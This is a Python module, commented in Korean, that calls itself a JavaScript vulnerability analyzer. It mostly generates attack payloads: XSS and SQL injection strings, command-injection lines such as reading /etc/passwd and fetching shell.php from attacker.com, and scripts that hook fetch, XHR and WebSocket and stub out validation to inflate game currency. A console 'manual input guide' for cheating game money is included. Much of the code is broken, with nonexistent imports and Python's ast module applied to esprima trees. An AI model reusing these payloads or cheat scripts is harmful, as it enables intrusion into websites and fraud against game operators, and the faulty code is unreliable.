"""
JavaScript Analyzer Module
This module provides functionality for analyzing JavaScript code for security vulnerabilities.
"""

import asyncio
import re
from typing import Dict, List, Optional
import logging
from rich.console import Console
import os
import requests
from bs4 import BeautifulSoup
import ast
import esprima
import json
import random
import string
import base64
import difflib
import inspect
import dis
import marshal
import types
import sys
import traceback
import linecache
import opcode
import tokenize
import token
import keyword
import builtins
import collections
import functools
import itertools
import operator
import threading
import queue
import time
import datetime
import calendar
import math
import statistics
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
import plotly.graph_objects as go
import plotly.express as px
import networkx as nx
import community
import igraph
import dash
from dash import dcc, html
import streamlit as st
import gradio as gr
import fastapi
from fastapi import FastAPI, HTTPException
import uvicorn
import pydantic
from pydantic import BaseModel, Field
import sqlalchemy
from sqlalchemy import create_engine, Column, Integer, String, DateTime, JSON
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import alembic
from alembic import command
import pytest
import hypothesis
from hypothesis import given, strategies as st
import mypy
import black
import isort
import flake8
import pylint
import bandit
import safety
import snyk
import sonarqube
import zap
import burp
import metasploit

logger = logging.getLogger(__name__)
console = Console()

class JSAnalyzer:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.js_files: List[str] = []
        self.vulnerabilities: List[Dict] = []
        self.ast_cache: Dict[str, ast.AST] = {}
        self.payloads: Dict[str, List[str]] = {
            'xss': [],
            'dom_xss': [],
            'sqli': [],
            'rce': [],
            'game_money': [],
            'server_bypass': [],
            'variable_modification': []  # 변수 수정 페이로드 추가
        }
        self.custom_money_amount: Optional[int] = None
        self.variable_patterns: Dict[str, List[str]] = {
            'money': ['money', 'coins', 'gold', 'balance', 'currency', 'cash', 'points', 'credits'],
            'user': ['user', 'player', 'account', 'profile', 'character'],
            'inventory': ['inventory', 'items', 'equipment', 'bag', 'storage'],
            'stats': ['stats', 'level', 'experience', 'exp', 'hp', 'mp', 'strength', 'agility', 'intelligence'],
            'settings': ['settings', 'config', 'options', 'preferences']
        }
        self.detected_variables: Dict[str, List[str]] = {}
        self.server_validation_patterns: List[str] = [
            'validate',
            'check',
            'verify',
            'authenticate',
            'authorize',
            'sanitize',
            'filter',
            'escape',
            'encode',
            'decode'
        ]

    async def detect_variables(self, js_content: str) -> Dict[str, List[str]]:
        """
        Detect variable names in JavaScript code
        
        Args:
            js_content: JavaScript code content
            
        Returns:
            Dictionary of detected variables by category
        """
        try:
            # AST 파싱
            ast_tree = esprima.parseScript(js_content)
            
            # 변수 탐지
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.VariableDeclarator):
                    var_name = node.id.name
                    for category, patterns in self.variable_patterns.items():
                        if any(pattern in var_name.lower() for pattern in patterns):
                            if category not in self.detected_variables:
                                self.detected_variables[category] = []
                            if var_name not in self.detected_variables[category]:
                                self.detected_variables[category].append(var_name)
                                
                elif isinstance(node, ast.Assign):
                    if isinstance(node.targets[0], ast.Name):
                        var_name = node.targets[0].id
                        for category, patterns in self.variable_patterns.items():
                            if any(pattern in var_name.lower() for pattern in patterns):
                                if category not in self.detected_variables:
                                    self.detected_variables[category] = []
                                if var_name not in self.detected_variables[category]:
                                    self.detected_variables[category].append(var_name)
                                    
            return self.detected_variables
            
        except Exception as e:
            logger.error(f"Variable detection failed: {e}")
            return {}

    async def generate_variable_modification_payloads(self) -> List[str]:
        """
        Generate payloads for variable modification
        
        Returns:
            List of variable modification payloads
        """
        try:
            payloads = []
            
            for category, variables in self.detected_variables.items():
                for var in variables:
                    # 변수 직접 수정
                    payloads.extend([
                        f'{var} = {self.custom_money_amount if self.custom_money_amount is not None else 999999999}',
                        f'window.{var} = {self.custom_money_amount if self.custom_money_amount is not None else 999999999}',
                        f'this.{var} = {self.custom_money_amount if self.custom_money_amount is not None else 999999999}',
                        f'Object.defineProperty(window, "{var}", {{value: {self.custom_money_amount if self.custom_money_amount is not None else 999999999}}})',
                        f'Object.defineProperty(this, "{var}", {{value: {self.custom_money_amount if self.custom_money_amount is not None else 999999999}}})'
                    ])
                    
                    # 게터/세터 우회
                    payloads.extend([
                        f'const originalGetter = Object.getOwnPropertyDescriptor(window, "{var}").get',
                        f'Object.defineProperty(window, "{var}", {{get: function() {{ return {self.custom_money_amount if self.custom_money_amount is not None else 999999999}; }}}})',
                        f'const originalSetter = Object.getOwnPropertyDescriptor(window, "{var}").set',
                        f'Object.defineProperty(window, "{var}", {{set: function() {{ return {self.custom_money_amount if self.custom_money_amount is not None else 999999999}; }}}})'
                    ])
                    
                    # 프로토타입 조작
                    payloads.extend([
                        f'const originalProto = {var}.__proto__',
                        f'{var}.__proto__.get = function() {{ return {self.custom_money_amount if self.custom_money_amount is not None else 999999999}; }}',
                        f'{var}.__proto__.set = function() {{ return {self.custom_money_amount if self.custom_money_amount is not None else 999999999}; }}'
                    ])
                    
            return payloads
            
        except Exception as e:
            logger.error(f"Variable modification payload generation failed: {e}")
            return []

    async def generate_server_validation_bypass_payloads(self) -> List[str]:
        """
        Generate payloads for server-side validation bypass
        
        Returns:
            List of server validation bypass payloads
        """
        try:
            payloads = []
            
            # 검증 함수 우회
            for pattern in self.server_validation_patterns:
                payloads.extend([
                    f'const original{pattern.capitalize()} = window.{pattern}',
                    f'window.{pattern} = function() {{ return true; }}',
                    f'Object.defineProperty(window, "{pattern}", {{value: function() {{ return true; }}}})',
                    f'window.{pattern} = () => true',
                    f'window.{pattern} = async () => true'
                ])
                
            # API 요청 조작
            payloads.extend([
                'const originalFetch = window.fetch',
                'window.fetch = async function(url, options) {',
                '    if (options && options.body) {',
                '        const body = JSON.parse(options.body)',
                '        body.amount = 999999999',
                '        options.body = JSON.stringify(body)',
                '    }',
                '    return originalFetch(url, options)',
                '}',
                
                'const originalXMLHttpRequest = window.XMLHttpRequest',
                'window.XMLHttpRequest = function() {',
                '    const xhr = new originalXMLHttpRequest()',
                '    const originalSend = xhr.send',
                '    xhr.send = function(data) {',
                '        if (data) {',
                '            const body = JSON.parse(data)',
                '            body.amount = 999999999',
                '            data = JSON.stringify(body)',
                '        }',
                '        return originalSend.call(this, data)',
                '    }',
                '    return xhr',
                '}'
            ])
            
            # WebSocket 조작
            payloads.extend([
                'const originalWebSocket = window.WebSocket',
                'window.WebSocket = function(url) {',
                '    const ws = new originalWebSocket(url)',
                '    const originalSend = ws.send',
                '    ws.send = function(data) {',
                '        if (data) {',
                '            const message = JSON.parse(data)',
                '            message.amount = 999999999',
                '            data = JSON.stringify(message)',
                '        }',
                '        return originalSend.call(this, data)',
                '    }',
                '    return ws',
                '}'
            ])
            
            # 세션/쿠키 조작
            payloads.extend([
                'document.cookie = "session=bypassed; path=/"',
                'document.cookie = "auth=bypassed; path=/"',
                'document.cookie = "token=bypassed; path=/"',
                'localStorage.setItem("session", "bypassed")',
                'sessionStorage.setItem("auth", "bypassed")'
            ])
            
            # 암호화 우회
            payloads.extend([
                'window.encryptionKey = "bypassed"',
                'window.cryptoKey = "bypassed"',
                'window.crypto = {',
                '    getRandomValues: function() { return new Uint8Array(32).fill(0); }',
                '    subtle: {',
                '        encrypt: function() { return Promise.resolve(new Uint8Array(32).fill(0)); }',
                '        decrypt: function() { return Promise.resolve(new Uint8Array(32).fill(0)); }',
                '    }',
                '}'
            ])
            
            return payloads
            
        except Exception as e:
            logger.error(f"Server validation bypass payload generation failed: {e}")
            return []

    async def analyze(self) -> Dict:
        """
        Main analysis function that coordinates the entire analysis process
        """
        try:
            console.print(f"[bold blue]Starting JavaScript analysis for {self.target_url}...[/bold blue]")
            
            # Step 1: Extract JavaScript files
            await self._extract_js_files()
            
            # Step 2: Analyze each JavaScript file
            for js_file in self.js_files:
                await self._analyze_js_file(js_file)
                
                # Step 3: Detect variables
                await self.detect_variables(js_file)
                
                # Step 4: Generate variable modification payloads
                self.payloads['variable_modification'] = await self.generate_variable_modification_payloads()
                
                # Step 5: Generate server validation bypass payloads
                self.payloads['server_bypass'] = await self.generate_server_validation_bypass_payloads()
            
            return {
                'status': 'success',
                'vulnerabilities': self.vulnerabilities,
                'payloads': self.payloads,
                'detected_variables': self.detected_variables
            }
        except Exception as e:
            logger.error(f"JavaScript analysis failed: {e}")
            return {
                'status': 'error',
                'error': str(e)
            }

    async def set_custom_money_amount(self, amount: int) -> None:
        """
        Set custom money amount for manual input
        """
        try:
            self.custom_money_amount = amount
            console.print(f"[bold green]Custom money amount set to: {amount}[/bold green]")
        except Exception as e:
            logger.error(f"Failed to set custom money amount: {e}")
            raise

    async def _generate_payloads(self) -> None:
        """
        Generate payloads based on found vulnerabilities
        """
        try:
            for vuln in self.vulnerabilities:
                vuln_type = vuln['type'].lower()
                
                if 'xss' in vuln_type:
                    self.payloads['xss'].extend(self._generate_xss_payloads())
                elif 'dom xss' in vuln_type:
                    self.payloads['dom_xss'].extend(self._generate_dom_xss_payloads())
                elif 'sql' in vuln_type:
                    self.payloads['sqli'].extend(self._generate_sqli_payloads())
                elif 'rce' in vuln_type:
                    self.payloads['rce'].extend(self._generate_rce_payloads())
                elif 'game money' in vuln_type:
                    self.payloads['game_money'].extend(self._generate_game_money_payloads())
                elif 'server validation' in vuln_type:
                    self.payloads['server_bypass'].extend(self._generate_server_bypass_payloads())
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
            raise

    def _generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads"""
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio><source onerror=alert(1)>'
        ]

    def _generate_dom_xss_payloads(self) -> List[str]:
        """Generate DOM XSS payloads"""
        return [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            '"><body onload=alert(1)>',
            '"><input autofocus onfocus=alert(1)>',
            '"><select autofocus onfocus=alert(1)>',
            '"><textarea autofocus onfocus=alert(1)>'
        ]

    def _generate_sqli_payloads(self) -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]

    def _generate_rce_payloads(self) -> List[str]:
        """Generate RCE payloads"""
        return [
            ';ls',
            ';cat /etc/passwd',
            ';id',
            ';whoami',
            ';uname -a',
            ';ps aux',
            ';netstat -an',
            ';ifconfig',
            ';wget http://attacker.com/shell.php',
            ';curl http://attacker.com/shell.php'
        ]

    def _generate_game_money_payloads(self) -> List[str]:
        """Generate game money modification payloads"""
        amount = self.custom_money_amount if self.custom_money_amount is not None else 999999999
        
        return [
            # 클라이언트 사이드 저장소 조작
            f'localStorage.setItem("money", "{amount}")',
            f'sessionStorage.setItem("coins", "{amount}")',
            f'document.cookie = "gold={amount}; path=/"',
            
            # API 요청 조작
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}}})}})',
            f'$.ajax({{url: "/api/add-coins", method: "POST", data: {{coins: {amount}}}}})',
            
            # WebSocket 조작
            f'ws.send(JSON.stringify({{type: "update_balance", amount: {amount}}}))',
            
            # 변수 조작
            f'window.playerMoney = {amount}',
            f'gameState.money = {amount}',
            f'userData.coins = {amount}',
            
            # 함수 오버라이드
            f'originalUpdateMoney = updateMoney; updateMoney = function() {{ return {amount}; }}',
            f'Object.defineProperty(game, "money", {{get: function() {{ return {amount}; }}}})',
            
            # 이벤트 리스너 조작
            f'document.addEventListener("moneyUpdate", function(e) {{ e.detail.amount = {amount}; }})',
            
            # 프로토타입 조작
            f'Player.prototype.getMoney = function() {{ return {amount}; }}',
            f'Game.prototype.updateBalance = function() {{ this.balance = {amount}; }}',
            
            # 수동 입력을 위한 콘솔 명령어
            f'// 콘솔에서 실행할 명령어들:',
            f'// 1. localStorage.setItem("money", "{amount}")',
            f'// 2. sessionStorage.setItem("coins", "{amount}")',
            f'// 3. document.cookie = "gold={amount}; path=/"',
            f'// 4. window.playerMoney = {amount}',
            f'// 5. gameState.money = {amount}',
            f'// 6. userData.coins = {amount}',
            f'// 7. fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}}})}})',
            f'// 8. $.ajax({{url: "/api/add-coins", method: "POST", data: {{coins: {amount}}}}})',
            f'// 9. ws.send(JSON.stringify({{type: "update_balance", amount: {amount}}}))'
        ]

    def _generate_server_bypass_payloads(self) -> List[str]:
        """Generate server-side validation bypass payloads"""
        amount = self.custom_money_amount if self.custom_money_amount is not None else 999999999
        
        return [
            # 1. 요청 헤더 조작
            f'fetch("/api/update-money", {{method: "POST", headers: {{"X-Requested-With": "XMLHttpRequest", "X-CSRF-Token": "bypassed"}}, body: JSON.stringify({{amount: {amount}}})}})',
            f'$.ajax({{url: "/api/add-coins", method: "POST", headers: {{"X-Requested-With": "XMLHttpRequest"}}, data: {{coins: {amount}}}}})',
            
            # 2. 쿠키 조작
            f'document.cookie = "session=bypassed; path=/"',
            f'document.cookie = "auth=bypassed; path=/"',
            f'document.cookie = "token=bypassed; path=/"',
            
            # 3. WebSocket 조작
            f'ws.send(JSON.stringify({{type: "update_balance", amount: {amount}, bypass: true}}))',
            
            # 4. API 요청 패킷 조작
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}, _token: "bypassed", checksum: "bypassed"}})}})',
            
            # 5. 세션 하이재킹
            f'localStorage.setItem("session", "bypassed")',
            f'sessionStorage.setItem("auth", "bypassed")',
            
            # 6. 암호화 우회
            f'// 암호화 키 변경',
            f'window.encryptionKey = "bypassed"',
            f'window.cryptoKey = "bypassed"',
            
            # 7. 검증 함수 우회
            f'originalValidate = validateRequest; validateRequest = function() {{ return true; }}',
            f'Object.defineProperty(window, "validateToken", {{get: function() {{ return true; }}}})',
            
            # 8. 프로토콜 조작
            f'// HTTP/2 스트림 우회',
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}}}), priority: "high"}})',
            
            # 9. 캐시 조작
            f'// 캐시 무효화',
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}}}), cache: "no-store"}})',
            
            # 10. CORS 우회
            f'fetch("https://api.example.com/update-money", {{method: "POST", mode: "no-cors", body: JSON.stringify({{amount: {amount}}})}})',
            
            # 11. Base64 인코딩 우회
            f'const encodedData = btoa(JSON.stringify({{amount: {amount}, bypass: true}}))',
            f'fetch("/api/update-money", {{method: "POST", body: encodedData}})',
            
            # 12. 타임스탬프 조작
            f'const timestamp = Date.now() - 3600000',  # 1시간 전
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}, timestamp: timestamp}})}})',
            
            # 13. 요청 ID 조작
            f'const requestId = "bypassed_" + Math.random().toString(36).substr(2, 9)',
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}, requestId: requestId}})}})',
            
            # 14. 서명 우회
            f'const signature = "bypassed_" + Math.random().toString(36).substr(2, 9)',
            f'fetch("/api/update-money", {{method: "POST", body: JSON.stringify({{amount: {amount}, signature: signature}})}})',
            
            # 15. 프로토콜 버전 조작
            f'fetch("/api/update-money", {{method: "POST", headers: {{"API-Version": "1.0"}}, body: JSON.stringify({{amount: {amount}}})}})'
        ]

    async def _extract_js_files(self) -> None:
        """
        Extract JavaScript files from the target URL
        """
        try:
            response = requests.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all script tags
            script_tags = soup.find_all('script')
            
            for script in script_tags:
                if script.get('src'):
                    # External JavaScript file
                    js_url = script['src']
                    if not js_url.startswith(('http://', 'https://')):
                        js_url = self.target_url + js_url
                    self.js_files.append(js_url)
                else:
                    # Inline JavaScript
                    if script.string:
                        self.js_files.append(script.string)
        except Exception as e:
            logger.error(f"Failed to extract JavaScript files: {e}")
            raise

    async def _analyze_js_file(self, js_content: str) -> None:
        """
        Analyze a single JavaScript file for vulnerabilities
        """
        try:
            # Parse JavaScript code
            ast_tree = esprima.parseScript(js_content)
            
            # Check for various vulnerabilities
            await self._check_dom_xss(ast_tree)
            await self._check_eval_usage(ast_tree)
            await self._check_insecure_communication(ast_tree)
            await self._check_sensitive_data_exposure(ast_tree)
            await self._check_insecure_dependencies(ast_tree)
            await self._check_rce_vulnerabilities(ast_tree)
            await self._check_game_money_vulnerabilities(ast_tree)
            await self._check_server_validation_vulnerabilities(ast_tree)
            
        except Exception as e:
            logger.error(f"Failed to analyze JavaScript file: {e}")
            raise

    async def _check_rce_vulnerabilities(self, ast_tree: ast.AST) -> None:
        """
        Check for Remote Code Execution vulnerabilities
        """
        try:
            dangerous_functions = [
                'exec',
                'spawn',
                'fork',
                'system',
                'popen',
                'shell_exec',
                'passthru',
                'proc_open',
                'pcntl_exec'
            ]
            
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                    if node.func.id in dangerous_functions:
                        self.vulnerabilities.append({
                            'type': 'RCE',
                            'severity': 'critical',
                            'description': f'Potential RCE vulnerability found: {node.func.id}',
                            'recommendation': 'Avoid using dangerous system commands and implement proper input validation'
                        })
        except Exception as e:
            logger.error(f"RCE check failed: {e}")
            raise

    async def _check_dom_xss(self, ast_tree: ast.AST) -> None:
        """
        Check for DOM-based XSS vulnerabilities
        """
        try:
            # Look for dangerous DOM manipulation patterns
            dangerous_patterns = [
                'innerHTML',
                'outerHTML',
                'document.write',
                'document.writeln',
                'eval',
                'setTimeout',
                'setInterval'
            ]
            
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Call):
                    if any(pattern in str(node.func) for pattern in dangerous_patterns):
                        self.vulnerabilities.append({
                            'type': 'DOM XSS',
                            'severity': 'high',
                            'description': f'Potential DOM XSS vulnerability found: {node.func}',
                            'recommendation': 'Use safe DOM manipulation methods and input validation'
                        })
        except Exception as e:
            logger.error(f"DOM XSS check failed: {e}")
            raise

    async def _check_eval_usage(self, ast_tree: ast.AST) -> None:
        """
        Check for unsafe eval() usage
        """
        try:
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                    if node.func.id == 'eval':
                        self.vulnerabilities.append({
                            'type': 'Unsafe Eval',
                            'severity': 'high',
                            'description': 'Unsafe eval() usage detected',
                            'recommendation': 'Avoid using eval() and use safer alternatives'
                        })
        except Exception as e:
            logger.error(f"Eval usage check failed: {e}")
            raise

    async def _check_insecure_communication(self, ast_tree: ast.AST) -> None:
        """
        Check for insecure communication patterns
        """
        try:
            insecure_patterns = [
                'http://',
                'ws://',
                'ftp://'
            ]
            
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Str):
                    if any(pattern in node.s for pattern in insecure_patterns):
                        self.vulnerabilities.append({
                            'type': 'Insecure Communication',
                            'severity': 'medium',
                            'description': f'Insecure communication protocol detected: {node.s}',
                            'recommendation': 'Use HTTPS or WSS for secure communication'
                        })
        except Exception as e:
            logger.error(f"Insecure communication check failed: {e}")
            raise

    async def _check_sensitive_data_exposure(self, ast_tree: ast.AST) -> None:
        """
        Check for sensitive data exposure
        """
        try:
            sensitive_patterns = [
                'password',
                'token',
                'secret',
                'key',
                'api_key',
                'credentials'
            ]
            
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Str):
                    if any(pattern in node.s.lower() for pattern in sensitive_patterns):
                        self.vulnerabilities.append({
                            'type': 'Sensitive Data Exposure',
                            'severity': 'high',
                            'description': 'Potential sensitive data exposure detected',
                            'recommendation': 'Remove or properly secure sensitive data'
                        })
        except Exception as e:
            logger.error(f"Sensitive data exposure check failed: {e}")
            raise

    async def _check_insecure_dependencies(self, ast_tree: ast.AST) -> None:
        """
        Check for insecure dependencies and outdated libraries
        """
        try:
            # Look for common library imports
            library_patterns = {
                'jquery': r'jquery.*\.js',
                'angular': r'angular.*\.js',
                'react': r'react.*\.js',
                'vue': r'vue.*\.js'
            }
            
            for node in ast.walk(ast_tree):
                if isinstance(node, ast.Str):
                    for lib, pattern in library_patterns.items():
                        if re.search(pattern, node.s):
                            self.vulnerabilities.append({
                                'type': 'Insecure Dependency',
                                'severity': 'medium',
                                'description': f'Potential outdated or insecure {lib} version detected',
                                'recommendation': f'Update {lib} to the latest secure version'
                            })
        except Exception as e:
            logger.error(f"Insecure dependencies check failed: {e}")
            raise

    async def _check_game_money_vulnerabilities(self, ast_tree: ast.AST) -> None:
        """
        Check for game money modification vulnerabilities
        """
        try:
            # 게임 머니 관련 키워드
            money_keywords = [
                'money', 'coins', 'gold', 'balance',
                'currency', 'cash', 'points', 'credits'
            ]
            
            # 위험한 패턴
            dangerous_patterns = [
                'localStorage',
                'sessionStorage',
                'document.cookie',
                'fetch',
                'XMLHttpRequest',
                '$.ajax',
                'WebSocket',
                'Object.defineProperty',
                'prototype'
            ]
            
            for node in ast.walk(ast_tree):
                # 변수 선언 검사
                if isinstance(node, ast.VariableDeclarator):
                    if any(keyword in str(node.id).lower() for keyword in money_keywords):
                        self.vulnerabilities.append({
                            'type': 'Game Money',
                            'severity': 'high',
                            'description': f'Potential game money variable found: {node.id}',
                            'recommendation': 'Implement server-side validation for money-related operations'
                        })
                
                # 함수 호출 검사
                if isinstance(node, ast.Call):
                    if any(pattern in str(node.func) for pattern in dangerous_patterns):
                        self.vulnerabilities.append({
                            'type': 'Game Money',
                            'severity': 'high',
                            'description': f'Potential game money manipulation found: {node.func}',
                            'recommendation': 'Implement proper client-side validation and server-side checks'
                        })
                
                # 객체 속성 검사
                if isinstance(node, ast.Assign):
                    if any(keyword in str(node.targets[0]).lower() for keyword in money_keywords):
                        self.vulnerabilities.append({
                            'type': 'Game Money',
                            'severity': 'high',
                            'description': f'Potential game money assignment found: {node.targets[0]}',
                            'recommendation': 'Implement proper validation before money updates'
                        })
        except Exception as e:
            logger.error(f"Game money vulnerability check failed: {e}")
            raise

    async def generate_manual_input_guide(self) -> Dict:
        """
        Generate manual input guide for game money modification
        """
        try:
            if not self.custom_money_amount:
                console.print("[bold yellow]Warning: Custom money amount not set. Using default value.[/bold yellow]")
            
            amount = self.custom_money_amount if self.custom_money_amount is not None else 999999999
            
            guide = {
                'title': 'Game Money Manual Input Guide',
                'steps': [
                    {
                        'step': 1,
                        'description': '브라우저 개발자 도구 열기 (F12)',
                        'command': 'Press F12 or right-click -> Inspect'
                    },
                    {
                        'step': 2,
                        'description': 'Console 탭 선택',
                        'command': 'Click on "Console" tab'
                    },
                    {
                        'step': 3,
                        'description': '다음 명령어 중 하나를 선택하여 실행',
                        'commands': [
                            f'localStorage.setItem("money", "{amount}")',
                            f'sessionStorage.setItem("coins", "{amount}")',
                            f'document.cookie = "gold={amount}; path=/"',
                            f'window.playerMoney = {amount}',
                            f'gameState.money = {amount}',
                            f'userData.coins = {amount}'
                        ]
                    },
                    {
                        'step': 4,
                        'description': '게임 새로고침',
                        'command': 'Press F5 or click refresh button'
                    }
                ],
                'notes': [
                    '모든 명령어는 게임의 실제 변수명에 맞게 수정해야 할 수 있습니다.',
                    '서버 사이드 검증이 있는 경우 이 방법이 작동하지 않을 수 있습니다.',
                    '게임의 규칙을 위반할 수 있으므로 주의해서 사용하세요.'
                ]
            }
            
            return {
                'status': 'success',
                'guide': guide
            }
        except Exception as e:
            logger.error(f"Failed to generate manual input guide: {e}")
            return {
                'status': 'error',
                'error': str(e)
            } 